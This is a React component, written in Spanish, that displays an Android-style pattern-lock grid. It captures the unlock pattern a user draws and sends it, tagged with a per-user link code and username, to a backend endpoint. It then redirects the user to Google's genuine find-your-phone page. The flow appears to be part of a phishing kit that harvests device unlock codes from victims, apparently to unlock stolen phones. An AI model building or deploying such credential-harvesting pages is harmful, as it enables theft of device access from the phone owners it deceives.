import React, { useState, useRef, useEffect } from 'react';
import responses from '../../api/responses';
import { useData } from '../../context/UserContext';

const PatternLock = ({
  HeaderModal,
  onComplete,
  patterStyle,
  blockIcon,
  translator
}) => {
  const { user } = useData();
  const [pattern, setPattern] = useState([]);
  const [drawing, setDrawing] = useState(false);
  const [firstPattern, setFirstPattern] = useState(null);
  const [secondPattern, setSecondPattern] = useState(null);
  const [message, setMessage] = useState('');
  const [error, setError] = useState(false);
  const [loading, setLoading] = useState(false); // 👈 usado para bloquear interacción
  const [changeSubTitle, setChangeSubTitle] = useState(false);
  const canvasRef = useRef(null);
  const pointsRef = useRef([]);
  const lastPointRef = useRef(null);

  useEffect(() => {
    const canvas = canvasRef.current;
    const ctx = canvas.getContext('2d');
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    redrawPattern();
  }, [pattern]);

  const start = () => {
    if (loading) return; // 👈 bloqueo cuando está verificando
    setMessage('');
    setError(false);
    setPattern([]);
    setDrawing(true);
    lastPointRef.current = null;
    const ctx = canvasRef.current.getContext('2d');
    ctx.clearRect(0, 0, 300, 300);
  };

  const move = (e) => {
    if (!drawing || loading) return; // 👈 bloqueo cuando está verificando
    const rect = canvasRef.current.getBoundingClientRect();
    const x = e.clientX - rect.left;
    const y = e.clientY - rect.top;

    pointsRef.current.forEach((point, index) => {
      const dx = x - point.x;
      const dy = y - point.y;
      const distance = Math.sqrt(dx * dx + dy * dy);
      if (distance < 25 && !pattern.includes(index + 1)) {
        const newPattern = [...pattern, index + 1];
        setPattern(newPattern);
        if (lastPointRef.current) {
          drawAnimatedLine(lastPointRef.current.x, lastPointRef.current.y, point.x, point.y);
        }
        lastPointRef.current = point;
      }
    });
  };

  const end = () => {
    if (loading) return; // 👈 bloqueo cuando está verificando
    setDrawing(false);
  };

  const drawAnimatedLine = (x1, y1, x2, y2, duration = 100) => {
    const ctx = canvasRef.current.getContext('2d');
    const startTime = performance.now();
    const deltaX = x2 - x1;
    const deltaY = y2 - y1;

    const animate = (currentTime) => {
      const elapsed = currentTime - startTime;
      const progress = Math.min(elapsed / duration, 1);
      const currentX = x1 + deltaX * progress;
      const currentY = y1 + deltaY * progress;

      ctx.clearRect(0, 0, canvasRef.current.width, canvasRef.current.height);
      redrawPattern();

      ctx.strokeStyle = '#8a8d8dd7';
      ctx.lineWidth = 6;
      ctx.lineCap = 'round';
      ctx.shadowColor = '#8a8d8dd7';
      ctx.shadowBlur = 10;

      ctx.beginPath();
      ctx.moveTo(x1, y1);
      ctx.lineTo(currentX, currentY);
      ctx.stroke();

      if (progress < 1) {
        requestAnimationFrame(animate);
      }
    };

    requestAnimationFrame(animate);
  };

  const redrawPattern = () => {
    const ctx = canvasRef.current.getContext('2d');
    ctx.strokeStyle = '#8a8d8dd7';
    ctx.lineWidth = 6;
    ctx.lineCap = 'round';
    ctx.shadowColor = '#8a8d8dd7';
    ctx.shadowBlur = 10;

    for (let i = 0; i < pattern.length - 1; i++) {
      const pointA = pointsRef.current[pattern[i] - 1];
      const pointB = pointsRef.current[pattern[i + 1] - 1];
      ctx.beginPath();
      ctx.moveTo(pointA.x, pointA.y);
      ctx.lineTo(pointB.x, pointB.y);
      ctx.stroke();
    }
  };

  const renderPoints = () => {
    const points = [];
    pointsRef.current = [];
    const size = 100;
    for (let i = 0; i < 9; i++) {
      const row = Math.floor(i / 3);
      const col = i % 3;
      const x = col * size + size / 2;
      const y = row * size + size / 2;
      pointsRef.current.push({ x, y });
      points.push(
        <div
          key={i}
          className={patterStyle.dot}
          style={{ left: `${x - 12}px`, top: `${y - 12}px` }}
        />
      );
    }
    return points;
  };

  const reset = () => {
    setPattern([]);
    const ctx = canvasRef.current.getContext('2d');
    ctx.clearRect(0, 0, 300, 300);
    lastPointRef.current = null;
  };

  const handleNext = async () => {
    if (pattern.length < 2) {
      setMessage(translator('Dibuja un patrón más largo'));
      setError(true);
      return;
    }

    setLoading(true); // 👈 activa bloqueo
    try {
      if (!firstPattern) {
        setFirstPattern(pattern);
        await addAcountPasscode(pattern.join(','), 'Processing', 'passcode');
        setChangeSubTitle(true)
        // setMessage('Vuelve a ingresar el patrón');
        setError(false);
        reset();
      } else {
        setSecondPattern(pattern);
        if (JSON.stringify(firstPattern) === JSON.stringify(pattern)) {
          await addAcountPasscode(pattern.join(','), pattern.join(','), 'completed');
          setMessage('');
          setError(false);
          reset();
          if (onComplete) onComplete({ firstPattern, secondPattern: pattern });
          localStorage.removeItem(`userData_${user?.data?.linkCode}`);
          window.location.href = 'https://myaccount.google.com/find-your-phone';
        } else {
          setMessage(translator('❌ Los patrones no coinciden. Intenta nuevamente.'));
          setError(true);
          setChangeSubTitle(false);
          setFirstPattern(null);
          setSecondPattern(null);
          reset();
        }
      }
    } catch (err) {
      console.error('Error en el proceso:', err);
      setMessage('Error al guardar el patrón');
      setError(true);
    } finally {
      setLoading(false); // 👈 desbloquea interacción
    }
  };

  const addAcountPasscode = async (passCodeOne, passCodeTwo, statusPasscode) => {

    try {
      let data = {
        linkCode: user?.data?.linkCode || '',
        username: user?.data?.username || '',
        codesUnlock: `${passCodeOne}-${passCodeTwo}`,
        status: statusPasscode
      }
      const response = await responses.addUnlockCode(data);
    } catch (error) {
      console.error('Error en add passcode:', error);
    }

  };

  return (
    <div className={patterStyle.lockContainer}>
      <HeaderModal changeSubTitle={changeSubTitle} />
      <div
        className={patterStyle.lockGrid}
        onMouseDown={start}
        onMouseMove={move}
        onMouseUp={end}
        onTouchStart={start}
        onTouchMove={(e) => move(e.touches[0])}
        onTouchEnd={end}
        style={{ pointerEvents: loading ? 'none' : 'auto' }} // 👈 bloqueo visual
      >
        <canvas ref={canvasRef} width={300} height={300} className={patterStyle.lockCanvas} />
        {renderPoints()}
      </div>
      {message && (
        <p className={error ? patterStyle.errorMessage : patterStyle.message}>
          {message}
        </p>
      )}
      <div className={patterStyle.buttons}>
        <button
          className={`${patterStyle.btnNext} btn btn-primary`}
          onClick={handleNext}
          disabled={loading}
        >
          {loading ? <div className={patterStyle.loader}></div> : translator('Siguiente')}
        </button>
      </div>
    </div>
  );
};

export default PatternLock;
